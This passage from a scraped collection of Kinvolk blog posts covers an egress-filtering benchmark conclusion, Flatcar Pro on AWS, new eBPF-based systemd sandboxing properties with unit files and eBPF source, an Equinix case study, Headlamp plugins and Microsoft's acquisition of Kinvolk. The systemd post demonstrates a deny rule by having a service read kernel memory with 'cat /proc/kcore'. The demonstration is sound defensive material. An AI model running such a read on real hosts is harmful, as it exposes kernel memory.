but clearly, we’re going beyond the limits\nthat anyone is likely to need for production. Conclusion Our results show that directly programming IP sets rules delivers the best overall performance for egress\ntraffic filtering. However, if you are running Kubernetes anyway, you will likely already be deploying a CNI\nprovider like Calico or Cilium, which already support declarative policies for egress filtering, and our tests\nshow that you should consider using these tools. Our benchmark tests show that Calico didn’t introduce any scalability issues, as shown by similar IP set and\nCalico curves across all metrics. Calico compensates for a minimal performance overhead (compared with raw ip\nsets) by offering reliability and flexibility of updating the list of egress filtering rules such that the\nentire operation is smooth, quick and hassle-free. If you are looking to implement node-level egress IP\nfiltering to your cluster, based on our tests we would recommend Calico as a viable, performant solution. If you are already using Cilium for Kubernetes networking, then it might make sense to use it for egress\nfiltering, provided the number of rules is not too large. We found Cilium showed scalability issues, in\nparticular failing when approaching 100,000 rules in our test scenarios. Of course, our scenarios are limited\nand it would not be fair to assume that Cilium would fare the same in other use cases. I would argue the case\non behalf of Cilium on two fronts: (a) The network policy features such as deny policies and host policies are\nbeta features and will certainly get optimizations as they mature to stable; and (b) The main use case of\nCilium lies in building on top of eBPF and providing\nobservability at a granularity that was not possible\nbefore, thanks to the emergence of eBPF. We are bullish on eBPF as a technology, and look forward to Cilium’s continued leadership and progress in this\narea. We also look forward to Calico completing its eBPF dataplane implementation, to enable a choice of eBPF\nsolutions for this use case. Since we are comparing Kubernetes CNI against other filters, it is also important to note that the benchmark\nsetup consisted of only one use case (egress filtering) while in a production environment a Kubernetes cluster\nwould be hosting other applications, with all the network policies being handled by the CNI. You should take\nthis benchmark as a narrow measure of one aspect of the performance of the solutions tested, and validate\nactual system-wide performance in your own environment. Update 2021-01-20: The introduction was updated to emphasize that this benchmark is use case specific,\nshould not be taken as a general performance comparison, and that the Cilium team does not recommend its use\nin production for egress filtering of large numbers of IP addresses.", "date": "2020-12-28"},
{"website": "Kinvolk", "title": "Flatcar Container Linux Pro now available on the AWS Marketplace", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Marga Manterola\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2021/02/flatcar-container-linux-pro-now-available-on-the-aws-marketplace/", "abstract": "Late last year we announced a new family of Flatcar Container Linux offerings, called Flatcar Container Linux Pro , a marketplace-delivered, cloud-optimized version of our well known Flatcar Container Linux solution. It’s ideal for production container environments requiring the highest performance, security and support. Being cloud-optimized means that our Flatcar Container Linux Pro offerings come with additional features, specific to each cloud provider. This allows our customers to make the most out of their cloud instances, while building on a common base OS that can run anywhere. We have now launched Flatcar Pro in the AWS Marketplace , which you can start using today on your AWS instances running container workloads. When creating Launch Templates, you can look for the Flatcar Pro AMIs delivered through the Marketplace, or if you use terraform templates, you can use the ‘ Flatcar-pro ’ prefix to query the Flatcar Pro AMIs. As our first differentiating feature, Flatcar Container Linux Pro for AWS comes with out-of-the-box support for using Flatcar on your Amazon EKS workers (check out our Flatcar workers on EKS blog post for all the details on how to do this). In upcoming releases we’ll keep adding more differentiating features, including built-in drivers for GPU instances and FIPS support to meet compliance requirements. All our Pro offerings also come with commercial support from Kinvolk. At a small fraction of your infrastructure costs you can have the peace of mind of running a commercially supported OS, that delivers the features you need on the platform of your choice. If you run into trouble while using Flatcar, we are there to help! And as we continue to expand these offerings, we’ll keep adding new specially tailored features. We’re interested in hearing from our customers regarding which features they are most looking forward to, let us know if there’s a feature you’d like for us to work on in the near future!", "date": "2021-02-09"},
{"website": "Kinvolk", "title": "Extending systemd Security Features with eBPF", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Mauricio Vásquez Bernal\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2021/04/extending-systemd-security-features-with-ebpf/", "abstract": "systemd is a system and service manager for Linux. It offers a set of security\nfeatures for sandboxing services in order to limit the set of system resources a\nservice can access. Some of these features include limiting access to resources\nlike memory and CPU, limiting the syscalls that can be used and so on. In this post\nwe’ll show how eBPF is currently used in systemd to implement some of those\nsecurity features and how supporting libbpf has opened the door to adding\nnew features. We’ll provide details about two of these new features that use\neBPF, how they can be used and we’ll dig into the implementation details. eBPF makes it possible to modify the Linux kernel behaviour – without\nrecompiling it – by loading a user-defined program into it. Those programs are\nexecuted upon different kernel events (known as hooks) and based on their return\nvalue the kernel modifies its behaviour. For example, an eBPF program could\nchoose to drop a network packet, refuse a system call or record the event for\ntracing purposes. systemd uses eBPF for IP filtering and accounting ,\nit also supports custom eBPF\nprograms to filter ingress and egress traffic. The IP filtering programs are\nwritten directly in eBPF assembly, which makes them efficient but also harder to\nmaintain and makes implementing new related functionalities unnecessarily\ndifficult. Fortunately, systemd has work-in-progress code to\nsupport eBPF programs written in pseudo-C and loaded with libbpf. Supporting eBPF programs written in pseudo-C is a game changer for eBPF in\nsystemd. This support will speed up the creation of new eBPF-based features as\nmany developers are familiar with C but not with eBPF assembly. Those features\nwill also be easier to maintain. Using a proven library for loading and managing\nthe eBPF objects (maps, programs and so on) like libbpf allows systemd to use\nadvanced features like Compile Once - Run Everywhere, a technology based on BTF\n(BPF Type Format) that allows running programs on different hosts without\nworrying about internal changes in kernel structures that could break them. We’ve implemented two new properties based on eBPF: RestrictFileSystems= and RestrictNetworkInterfaces= . Note : our work is still in review and the implementation is subject to change\nbased on review comments. We’ll update this blog post when they’re merged. RestrictFileSystems= RestrictFileSystems= allows limiting the filesystem types processes in a\nsystemd service have access to. For example, if a systemd service specifies “RestrictFileSystems=ext4 tmpfs” , processes belonging to that service can only\naccess files living in an ext4 or tmpfs filesystem. A deny-list approach is also\nsupported. For example, processes in a systemd unit specifying “RestrictFileSystems=~tracefs” cannot access files on tracefs filesystems.\nThis feature adds an extra layer of security preventing processes from accessing\nsecurity sensitive filesystems like debugfs or tracefs even if they are running\nas root. How to Use This feature requires a kernel >= 5.7 configured with CONFIG_BPF_LSM , CONFIG_DEBUG_INFO_BTF and the BPF LSM enabled (via CONFIG_LSM=\"...,bpf\" or\nthe \"lsm=\" kernel boot parameter). The system must also use cgroup2 (unified\nor hybrid) and libbpf >= 0.2.0 must be installed. The LSM hook is very new and\nit’s only enabled on kernels of some of the popular distributions, for that\nreason if you want to use that feature before it lands in the distributions,\nyou’ll have to compile your own kernel with those configuration knobs enabled. In the following example we’ll use three different paths with different\nfilesystems, let’s look at the (trimmed) output of the mount command $ mount\nproc on /proc type proc (rw,nosuid,nodev,noexec,relatime)\n/dev/sda1 on / type ext4 (rw,relatime)\ntmpfs on /tmp type tmpfs (rw,nosuid,nodev,nr_inodes=409600) Let’s start with a unit file that can only access ext4 filesystems and tries to\naccess a file on /tmp (tmpfs). $ echo \"This is my file\" > /tmp/myfile\n$ cat /lib/systemd/system/myservice.service\n[Unit]\nDescription=My test unit\n[Service]\nExecStart=cat /tmp/myfile\nRestrictFileSystems=ext4\n$ systemctl start myservice\n$ journalctl -u myservice\nFeb 01 19:20:46 ubuntu-focal systemd[1]: Started My test unit.\nFeb 01 19:20:47 ubuntu-focal cat[9672]: cat: /tmp/myfile: Operation not permitted\nFeb 01 19:20:47 ubuntu-focal systemd[1]: myservice.service: Main process exited, code=exited, status=1/FAILURE\nFeb 01 19:20:47 ubuntu-focal systemd[1]: myservice.service: Failed with result 'exit-code'.\n$ systemctl stop myservice We can see that the unit fails because the cat process inside the unit is not\nable to access the /tmp/myfile file. Let’s add permissions for the tmpfs\nfilesystem. $ sudo cat /lib/systemd/system/myservice.service\n[Unit]\nDescription=My test unit\n[Service]\nExecStart=cat /tmp/myfile\nRestrictFileSystems=ext4 tmpfs\n$ systemctl start myservice\n$ journalctl -u myservice\nFeb 01 19:26:45 ubuntu-focal systemd[1]: Started My test unit.\nFeb 01 19:26:45 ubuntu-focal cat[10077]: This is my file\nFeb 01 19:26:45 ubuntu-focal systemd[1]: myservice.service: Succeeded. We can see how in this case, as expected, the cat process inside the service is\nable to access the file. This example could not be that interesting, let’s try\nanother one where we forbid access to a dangerous kind of file system, like\nproc. $ sudo cat /lib/systemd/system/myservice.service\n[Unit]\nDescription=My test unit\n[Service]\nExecStart=cat /proc/kcore\nRestrictFileSystems=~proc\n$ systemctl start myservice\n$ journalctl -u myservice\nFeb 01 19:47:29 ubuntu-focal systemd[1]: Started My test unit.\nFeb 01 19:47:29 ubuntu-focal cat[11284]: cat: /proc/kcore: Operation not permitted\nFeb 01 19:47:29 ubuntu-focal systemd[1]: myservice.service: Main process exited, code=exited, status=1/FAILURE\nFeb 01 19:47:29 ubuntu-focal systemd[1]: myservice.service: Failed with result 'exit-code'. The systemd.exec man page will offer more information on the RestrictFileSystems= usage. Implementation This feature is implemented by attaching an eBPF program ( BPF_PROG_TYPE_LSM )\nto the file_open BPF LSM hook ( BPF_LSM_MAC ). The program is attached at boot\ntime and stays there until shutdown. Then, when a service specifying the RestrictFileSystems= property is started, an entry is added to a global BPF\nhashmap pinned to the BPF filesystem under /sys/fs/bpf/systemd/lsm_bpf_map .\nThe map stores a set of filesystem magic numbers per cgroupID. When a process\ntries to open a file, the BPF program is executed and checks which cgroup the\nprocess is running in: if an entry is present in the global map it checks if the\nfilesystem the process is trying to access is present in the set, and according\nto the policy, allow-list vs deny-list, access is denied or not. The eBPF program receives as argument a struct file\n* containing a struct inode\n* , that\ncontains struct super_block\n* and it finally has the superblock magic\nnumber .\nThose structures are internal to the kernel and can change from version to\nversion, i.e. the offset of those fields within each structure could change and\na program compiled for a given kernel version won’t work in a different one. The\nBPF Type Format (BTF) infrastructure offers a solution to this problem. The\nstructures are defined in the eBPF program with the __attribute__((preserve_access_index)) clang attribute that tells the verifier\nto update the offsets of those fields at load time. This mechanism is also known\nas Compile Once - Run Everywhere, more details can be found in the BPF\nPortability and\nCO-RE blog post. The following is the full implementation of the eBPF program: /* SPDX-License-Identifier: GPL-2.0-only */ #include <linux/types.h> #include <linux/bpf.h> #include <bpf/bpf_helpers.h> #include <bpf/bpf_tracing.h> #include <bpf/bpf_core_read.h> #include <errno.h> #include <stddef.h> #include <stdint.h> struct super_block { long unsigned int s_magic;\n} __attribute__((preserve_access_index)); struct inode { struct super_block * i_sb;\n} __attribute__((preserve_access_index)); struct file { struct inode * f_inode;\n} __attribute__((preserve_access_index)); struct {\n        __uint(type, BPF_MAP_TYPE_HASH_OF_MAPS);\n        __uint(max_entries, 2048 ); /* arbitrary */ __type(key, uint64_t); /* cgroup ID */ __type(value, uint32_t); /* fs magic set */ } cgroup_hash SEC( \".maps\" );\n\nSEC( \"lsm/file_open\" ) int BPF_PROG(restrict_filesystems, struct file * file, int ret)\n{ unsigned long magic_number;\n        uint64_t cgroup_id;\n        uint32_t * value, * magic_map, zero = 0 , * is_allow; /* ret is the return value from the previous BPF program or 0 if it's * the first hook */ if (ret != 0 ) return ret;\n\n        BPF_CORE_READ_INTO( & magic_number, file, f_inode, i_sb, s_magic);\n\n        cgroup_id = bpf_get_current_cgroup_id();\n\n        magic_map = bpf_map_lookup_elem( & cgroup_hash, & cgroup_id); if ( ! magic_map) return 0 ; if ((is_allow = bpf_map_lookup_elem(magic_map, & zero)) == NULL ) { /* Malformed map, it doesn't include whether it's an allow list * or a deny list. Allow. */ return 0 ;\n        } if ( * is_allow) { /* Allow-list: Allow access only if magic_number present in inner map */ if (bpf_map_lookup_elem(magic_map, & magic_number) == NULL ) return - EPERM;\n        } else { /* Deny-list: Allow access only if magic_number is not present in inner map */ if (bpf_map_lookup_elem(magic_map, & magic_number) != NULL ) return - EPERM;\n        } return 0 ;\n} Full details of the implementation can be found in the Github Pull Request\n#18145 introducing this support. RestrictNetworkInterfaces= RestrictNetworkInterfaces= allows limiting the network interfaces that\nprocesses in a systemd service have access to. For example, if a systemd service\nspecifies RestrictNetworkInterfaces=eth0 eth1 , processes belonging to that\nservice can only use the eth0 and eth1 network interfaces, and not others that\nmight be present on the host (like eth2 or bond0). It also supports a deny-list\napproach. For example, processes in a systemd service specifying RestrictNetworkInterfaces=~bond0 won’t be able to access bond0. This increases security as it prevents processes from accessing network\ninterfaces they shouldn’t have access to even if they are privileged processes. How to Use In order to use this feature, a kernel >= 5.7 with CONFIG_CGROUP_BPF enabled\nis required. This version was released almost a year ago and most distributions\nenable that option by default. A systemd version with the feature merged, eBPF\nsupport enabled and libbpf >= 0.2.0 installed on the host are the other\nrequirements to make it work. Before setting the unit, let’s check what the interfaces are and what’s the one\nused to get access to the internet. $ ip link ls up\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000\n\tlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000\n\tlink/ether 02:7c:95:13:d4:48 brd ff:ff:ff:ff:ff:ff\n3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000\n\tlink/ether 08:00:27:29:7e:64 brd ff:ff:ff:ff:ff:ff\n\n$ ip route\ndefault via 10.0.2.2 dev enp0s3 proto dhcp src 10.0.2.15 metric 100\n10.0.2.0/24 dev enp0s3 proto kernel scope link src 10.0.2.15\n10.0.2.2 dev enp0s3 proto dhcp scope link src 10.0.2.15 metric 100\n192.168.33.0/24 dev enp0s8 proto kernel scope link src 192.168.33.10 We can see that the system has three network interfaces: lo (loopback), enp0s3\nused to connect to the internet, and enp0s8 to reach the 192.168.33.0/24 network. Let’s start a process inside a temporary unit that can only access the enp0s3\ninterface: $ sudo systemd-run -t -p RestrictNetworkInterfaces=enp0s3 ping 8.8.8.8\nRunning as unit: run-u11.service\nPress ^] three times within 1s to disconnect TTY.\nPING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=63 time=18.3 ms\n64 bytes from 8.8.8.8: icmp_seq=2 ttl=63 time=32.2 ms\n64 bytes from 8.8.8.8: icmp_seq=3 ttl=63 time=21.5 ms\n64 bytes from 8.8.8.8: icmp_seq=4 ttl=63 time=19.4 ms\n^C\n--- 8.8.8.8 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3004ms\nrtt min/avg/max/mdev = 18.318/22.848/32.177/5.504 ms As expected, ping works successfully. Let’s try again giving access to the\nenp0s8 interface only. $ sudo systemd-run -t -p RestrictNetworkInterfaces=enp0s8 ping 8.8.8.8\nRunning as unit: run-u12.service\nPress ^] three times within 1s to disconnect TTY.\nPING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n/usr/bin/ping: sendmsg: Operation not permitted\n/usr/bin/ping: sendmsg: Operation not permitted\n/usr/bin/ping: sendmsg: Operation not permitted\n/usr/bin/ping: sendmsg: Operation not permitted\n^C\n--- 8.8.8.8 ping statistics ---\n4 packets transmitted, 0 received, 100% packet loss, time 3256ms In this case, the ping command doesn’t work because the packet is routed\nthrough the enp0s3 interface, that is forbidden. There is no special exception regarding the loopback interface, you explicitly\nhave to give/deny access to it. For instance, the lo interface is typically needed for DNS resolution. $ sudo systemd-run -t -p RestrictNetworkInterfaces=\"enp0s3\" ping kinvolk.io\nRunning as unit: run-u24.service\nPress ^] three times within 1s to disconnect TTY.\n/usr/bin/ping: kinvolk.io: Temporary failure in name resolution\n\n$ sudo systemd-run -t -p RestrictNetworkInterfaces=\"enp0s3 lo\" ping kinvolk.io\nRunning as unit: run-u25.service\nPress ^] three times within 1s to disconnect TTY.\nPING kinvolk.io (172.67.196.142) 56(84) bytes of data.\n64 bytes from 172.67.196.142 (172.67.196.142): icmp_seq=1 ttl=63 time=43.7 ms\n64 bytes from 172.67.196.142 (172.67.196.142): icmp_seq=2 ttl=63 time=44.6 ms\n^C\n--- kinvolk.io ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1013ms\nrtt min/avg/max/mdev = 43.731/44.183/44.636/0.452 ms The systemd.resource-control man page will provide more information on the RestrictNetworkInterfaces= usage. Implementation This feature uses two eBPF programs ( BPF_PROG_TYPE_CGROUP_SKB ), attached to\ningress ( BPF_CGROUP_INET_INGRESS ) and egress ( BPF_CGROUP_INET_EGRESS ). These\nprograms are executed each time a process in the cgroup tries to send or\nreceive a network packet. If the program returns 1 the packet is forwarded,\notherwise it’s dropped. The argument of those programs is a struct\n__sk_buff\n* ,\nwhich contains the ifindex field indicating the index of the network interface\nwhere the packet is being sent/received. An eBPF hashmap contains the list of indexes of the network interfaces to\ndeny/allow. The key size is 4 as the interface index is 4-bytes long, the size\nof the value doesn’t matter as the map is used as a set. The size of the map is\nset in the control code according to the number of interfaces in the rules\nbefore loading the eBPF objects. The is_allow_list global variable defines whether the map represents the list\nof network interfaces to allow or deny. There is a lookup using the ifindex\nmember of the struct __sk_buff , then based on whether it’s an allow or deny\nlist, the packet is dropped or forwarded. The common part of the code for both programs is abstracted in a single\nfunction, then both programs are defined. SEC(\"cgroup_skb/egress\") and SEC(\"cgroup_skb/ingress\") allows libbpf to understand the program and attach\ntype and avoids us to specify that again in the control code. The following is the full implementation of the eBPF part: /* SPDX-License-Identifier: LGPL-2.1-or-later */ /* <linux/bpf.h> must precede <bpf/bpf_helpers.h> due to integer types * in bpf helpers signatures. */ #include <linux/bpf.h> #include <bpf/bpf_helpers.h> const volatile __u8 is_allow_list = 0 ; /* Map containing the network interfaces indexes. * The interpretation of the map depends on the value of is_allow_list. */ struct {\n        __uint(type, BPF_MAP_TYPE_HASH);\n        __type(key, __u32);\n        __type(value, __u8);\n} ifaces_map SEC( \".maps\" ); #define DROP 0 #define PASS 1 static inline int restrict_network_interfaces_impl ( struct __sk_buff * sk) {\n        __u32 zero = 0 , ifindex;\n        __u8 * lookup_result;\n\n        ifindex = sk -> ifindex;\n        lookup_result = bpf_map_lookup_elem( & ifaces_map, & ifindex); if (is_allow_list) { /* allow-list: let the packet pass if iface in the list */ if (lookup_result) return PASS;\n        } else { /* deny-list: let the packet pass if iface *not* in the list */ if ( ! lookup_result) return PASS;\n        } return DROP;\n}\n\nSEC( \"cgroup_skb/egress\" ) int restrict_network_interfaces_egress( struct __sk_buff * sk)\n{ return restrict_network_interfaces_impl(sk);\n}\n\nSEC( \"cgroup_skb/ingress\" ) int restrict_network_interfaces_ingress( struct __sk_buff * sk)\n{ return restrict_network_interfaces_impl(sk);\n} char _license[] SEC( \"license\" ) = \"LGPL-2.1-or-later\" ; The full changes done in the implementation and the associated eBPF code can be\nfound in the Github Pull Request #18385 . Dependencies Summary The following table summarizes the minimal dependencies needed to use the two\nnew properties. Property systemd Kernel Kernel options libbpf RestrictFileSystems= v249* 5.7 CONFIG_BPF CONFIG_BPF_SYSCALL CONFIG_BPF_LSM CONFIG_DEBUG_INFO_BTF CONFIG_LSM=”…,bpf\" v0.2.0 RestrictNetworkInterfaces= v249* 5.7 CONFIG_BPF CONFIG_BPF_SYSCALL CONFIG_CGROUP_BPF v0.2.0 Note : we hope to get the PRs merged and have these functionalities available in v249. Future Work The introduction of support for eBPF programs in pseudo-C in systemd definitely\nopens the door for amazing new uses of eBPF there. Part of the near future\ncould be to port the existing security features ( IPAddressDeny= , IPAccounting= , IPAddressAllow= ) to this approach in order to make it easier to maintain and\nextend them. Another idea is to implement a full firewall solution that is able\nto filter by more L4 fields like ports, protocols and flags and not only the L3\naddress like the current solution. We would like to thanks Lennart Poettering who provided valuable feedback on the\nimplementation and  blog post.", "date": "2021-04-09"},
{"website": "Kinvolk", "title": "Case Study: Equinix Metal Builds on Flatcar", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Andy Randall\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2021/02/case-study-equinix-metal-builds-on-flatcar/", "abstract": "It started as a crazy idea. Back in 2014, the cloud rush had just started. Compute workloads were moving to “virtual machines as a service”. This was the inevitable future of IT. A small team of industry veterans, however, saw things differently. They believed there would be users who wanted the guaranteed performance, security and control of running their own bare metal, but with the experience of the cloud. The idea of a “bare metal cloud” was born, along with the company, Packet, that would define the category. Fast forward to 2020. Equinix, the world’s largest data center and interconnection provider, acquires Packet. With 220+ facilities spread across 63 metros in 27 countries, Equinix has more than just scale: it also helps to create nearly 400,000 low-latency interconnections between its tenants, from Google Cloud to Zoom. For Packet —now known as Equinix Metal ™ and with the resources of a $65 billion company behind it — their  ambitious plans for redefining the next wave of cloud are accelerating. Over the course of just a few months, the team deploys the Metal platform in nearly 20 of Equinix’s most popular locations — the literal “center” of the internet. There is just one problem. Sustaining growth at this pace would not be possible with the cloud management infrastructure built for Packet’s early startup days. A refactoring is required, to enable resilience, flexibility, and security — and scalability to support a control plane for the Metal platform in hundreds of locations. Working with Kinvolk, the team decides to build its next generation cloud control plane on Kubernetes, running atop Flatcar Container Linux. Nicole Hubbard, principal engineer on the Equinix Metal delivery engineering team, puts it like this: “I need the security and management to be as simple as possible, and as automated as possible. Manually patching our Ubuntu hosts is hard enough when we have only 30 of them. In practice, that means they don’t get security updates. If we can’t do it at that scale, we definitely can’t do it as we scale to hundreds and thousands in the future.” Nicole was already familiar with the concept of an immutable, auto-updating container Linux, having used CoreOS at various points in her career, which includes stints at Rackspace, WP Engine, and Microsoft. So Flatcar was “everything we expected it to be. The management overhead is massively reduced. Flatcar allows us to start thinking about our bare metal nodes like they’re cloud instances, we can think of them as more ephemeral. It’s really hard to explain, but once you’ve experienced what it’s like to run immutable infrastructure, you never want to go back.” “Also important to us is the atomic nature of Flatcar updates, which comes with the ability to rollback easily,” continues Nicole. “For example, one point release included a systemd update that broke our Kubernetes networking. We could just rollback to the previous release while we diagnosed and fixed the problem. What might have been a major headache with a traditional Linux distro ended up being really simple with Flatcar.” A positive surprise compared with her CoreOS experience is the Kinvolk Update Service, which “allows us to push updates to all our nodes via a Web UI, and gives us a single pane of glass to see the state of our nodes as they upgrade, which is kind of fun to watch!” Given the mission-critical nature of Flatcar in the Equinix Metal control plane, Equinix views a support relationship with Kinvolk as essential. Says Nicole: “We have a great collaboration with the Kinvolk engineering team. All the communications have been outstanding and helpful.” The bottom line? “Adopting Flatcar Container Linux, and relying on Kinvolk’s expert support, allows us to focus on the Kubernetes layer and what runs on it, which is what we really care about.”", "date": "2021-02-25"},
{"website": "Kinvolk", "title": "Improving the developer experience for Headlamp plugins", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Joaquim Rocha\n    \n    \n    /\n    \n    \n  \n    \n    \n      René Dudfield\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2021/04/improving-the-developer-experience-for-headlamp-plugins/", "abstract": "We released Headlamp (a generic Kubernetes web UI) last November with one of its core features being “frontend plugins”. These are extensions whose purpose is to offer extra functionality that is not available in Headlamp by default. Plugins are written in Typescript (or Javascript), compiled into a single module using webpack , and loaded by Headlamp’s backend which makes them available for the frontend to dynamically load. The process above works well and is transparent to Headlamp’s users. However, the development of those plugins meant different workflows when it came to developing them and to building/shipping them, ultimately requiring developers to move the plugins around, into the Headlamp’s source tree for hot-reload and debugging, and outside into a “plugins folder” for development. It quickly became clear that this was not the best development experience we could offer, and so we’ve been working hard to greatly improve the workflow of developing plugins for Headlamp. Simplifying the plugin development workflow To greatly simplify the plugin development story, we leveraged Headlamp’s plugin deployment mechanism instead of creating a completely different way of developing a plugin vs deploying it. i.e. the new plugin development workflow consists in continuously making the plugins available as if they were deployed and loading that list of plugins, as well as the frontend, when there are changes. For making the plugin creation and programming easier, we revamped the @kinvolk/headlamp-plugin package we had already since last year. Now this command is able to start a fresh plugin, rebuild/redeploy them on every change, and prepare the plugins for shipment/production. npx @kinvolk/headlamp-plugin create headlamp-myfancy\ncd headlamp-myfancy\nnpm run start Development on desktop Headlamp Since plugins were initially developed with the “in-cluster” deployments in mind, for different vendors to provide a unique Kubernetes web UI to their users, Headlamp’s desktop apps did not support the use of plugins. With this new 0.3.0 version however, the Headlamp desktop app has full support for plugins. It now looks for changes and automatically reloads the UI as well, if a plugin is changed. This effectively means that plugin developers no longer need to clone Headlamp’s repository and build it just for developing plugins, as using one of the desktop applications works for loading and seeing any changes throughout the plugins' development. How to make a Headlamp plugin Instead of duplicating the How to Create a Plugin section we have in our documentation, we thought we’d create a short video to illustrate how you can develop a Headlamp plugin: Development Resources We can break down the development resources for a Headlamp plugin into: examples, a component development environment (storybook), and the development API. Examples As developers, we are used to learning by looking into others’ code. So if you are also like that, you can take a look at the plugins examples folder we have as part of Headlamp’s repository, as well as the plugins we have as part of the Lokomotive Web UI. A component playground To make it easier to discover Headlamp’s components and how they work or how they can be used inside of plugins, we have set up a “ Storybook ”. This lets developers search for components and play with them, changing their inputs to see what they do. Plugins are not limited to using Headlamp GUI components, they can also use a large selection of Material UI components, but using Storybook is a great way to learn about Headlamp’s internals, for plugin use or for contributing changes to Headlamp itself. Check out the documentation on how to run the Headlamp storybook . Detailed API reference To help with the plugin development, or indeed with understanding Headlamp’s internals, we have started on a detailed Headlamp’s API reference guide. Classes, functions and other things are listed with their respective types. You can read the Headlamp API reference integrated into the project’s developer documentation. Shipping plugins Once plugins are ready to be deployed in production (for in-cluster deployments), they need to be extracted into a “plugins directory”. To make that easy, our already known headlamp-plugin tool now has a new command to extract one or more plugins to a plugins directory. npx @kinvolk/headlamp-plugin extract your-plugins path/to/.plugins\nnpx @kinvolk/headlamp-plugin extract your-plugins/headlamp-myfancy path/to/.plugins Be sure to check more details on deploying plugins in the “ Building and Shipping plugins ” part of the documentation. Your plugins We built the plugins capability for enabling use-cases beyond what we perceive as core to the experience of managing Kubernetes, and are looking forward to seeing what others can do with it. Moreover, we are also planning on having an official list of plugins soon. So do let us know what plugins you are working or interested in working on! Or tell us what we need to improve to support your use-case through plugins. You can reach us at the #headlamp channel in the Kubernetes Slack, or file an issue on the Headlamp repo . … but that’s not all! While this article is about the new plugin development experience, we do have other new features in this Headlamp 0.3.0 release. For example, we now support ARM64 Apple Silicon (M1), a new YAML view for resources, and more! So make sure to also check out this new version’s release notes .", "date": "2021-04-07"},
{"website": "Kinvolk", "title": "Microsoft acquires Kinvolk", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kühl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2021/04/microsoft-acquires-kinvolk/", "abstract": "Today, we are excited to announce that Kinvolk has been acquired by Microsoft. Back in 2015, we set out to create a company that focused on building and improving open source Linux technologies in the cloud native space. Our main goals were to have a significant positive impact on the open source communities we are involved in, and to work on projects and technologies that allowed us to focus on collaboration over competition. We join Microsoft to further these goals in ways that we could not have done alone. The name “Kinvolk” (from “kinfolk”, meaning extended family, with a German twist) was chosen to highlight the importance to us of community in the broadest sense: employees, customers, partners, collaborators, and everyone who attends Kinvolk-backed events like Cloud Native Rejekts or All Systems Go! . Our earliest projects for customers like CoreOS and WeaveWorks established our reputation as Linux and cloud native technology experts, and when CoreOS was acquired by Red Hat, we saw the opportunity to help the community by filling a void with our own Flatcar Container Linux distribution, soon followed by Lokomotive and Inspektor Gadget , our suite of eBPF-based tools for debugging and inspecting Kubernetes clusters. Throughout this journey, consistent with our values (“Cooperation > Competition”, “Community > Product”, “Contributing > Consuming”, and “Welcoming > Excluding”), we have built close relationships with many of you in the cloud native community. In particular, we have had a really close partnership with Microsoft, going back to our collaboration on Service Mesh Interface , then bringing Flatcar Container Linux to Azure and supporting the migration of major Azure customers from CoreOS to Flatcar, and most recently enabling support for Azure Kubernetes Service (AKS) with Lokomotive and Inspektor Gadget. We look forward to being able to focus our efforts on our open source work, to realizing the full potential of eBPF in Kubernetes with tools like Inspektor Gadget, and working on Kubernetes, systemd, and the many other communities we are active in. We are also eager to collaborate with the Microsoft product teams to help bring these leading-edge open source capabilities to a much larger customer community via Azure Kubernetes Service, Azure Arc, and many other services and products. Our primary mission, though, will remain our open source projects, and enabling those projects to be used across all platforms. There will doubtless be a lot of questions, particularly among the Flatcar Container Linux user community. Microsoft has been clear that we are to ensure continuity for users who have already gone through a lot of upheaval over the past couple of years. This will not be a replay of the movie you’ve seen before. In fact, we and Microsoft are committed to doubling down on the Flatcar community: we want to expand the universe of partners, contributors, and users, to ensure a vibrant, successful and sustainable long-term future for Flatcar as a truly open, community-driven project. As a first step towards that future, we welcome you to join the first of our new monthly community meetings . When you do open source right, you do not do it alone, you do it in collaboration with the open source community. And we intend to continue that approach as a part of Microsoft. We look forward to continuing to collaborate closely with you all, even as the Kinvolk team moves into the next phase of our journey. Same team, different company, volks. ❤️", "date": "2021-04-29"},
{"website": "Kinvolk", "title": "Using eBPF in Flatcar Container Linux", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Mauricio Vásquez Bernal\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2021/04/using-ebpf-in-flatcar-container-linux/", "abstract": "Extended Berkeley Packet Filter (eBPF) is a core Linux technology with multiple\napplications in different computer domains like security, networking and\ntracing. For the containers and Kubernetes specific case, it’s used with\nnetworking projects like Cilium or Calico, debugging solutions like BCC,\nkubectl-trace and Inspektor Gadget, and security-related projects like tracee\nand Falco. eBPF is a very fast evolving technology: each new kernel release includes new\nfeatures, and different Linux distributions rush to enable them for their users.\nFlatcar Container Linux is no exception, and in this blog post I cover the new\neBPF features that we have enabled in the lastest Flatcar versions and why they\nare important. Since Flatcar is an immutable OS, i.e the system partition is read only, we’ll\nuse toolbox to create a dev environment\nwhere we can install the dependencies and tools we need without affecting the\nhost in some of the examples; in others we will use Docker. CONFIG_IKHEADERS This option is used to expose the kernel headers through a kernel module. When\nthe module is loaded, it creates the /sys/kernel/kheaders.tar.xz file with the\nkernel headers in a compressed format that can be uncompressed to a temporary\nlocation to be used by the different tools when compiling eBPF programs. This\noption is beneficial because it avoids installing the kernel headers on the host\nand also having to share the system folder containing the headers with\ncontainers. This option is already available in the 